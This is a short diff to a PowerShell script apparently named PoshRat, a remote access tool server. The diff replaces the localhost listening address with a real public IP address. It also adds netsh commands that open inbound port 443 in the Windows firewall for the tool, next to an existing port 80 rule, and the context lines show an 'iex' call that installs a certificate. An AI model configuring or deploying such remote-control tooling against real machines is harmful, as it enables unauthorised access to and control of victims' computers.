@@ -9,7 +9,7 @@
   
 #>
 
-$Server = '127.0.0.1' #Listening IP. Change This.
+$Server = '73.181.78.130' #Listening IP. Change This.
 
 function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 {
@@ -141,6 +141,9 @@ iex $installCert
 
 netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
 netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+netsh advfirewall firewall delete rule name="PoshRat 443" | Out-Null
+netsh advfirewall firewall add rule name="PoshRat 443" dir=in action=allow protocol=TCP localport=443 | Out-Null
+
 
 $listener.Start()
 'Listening ...'
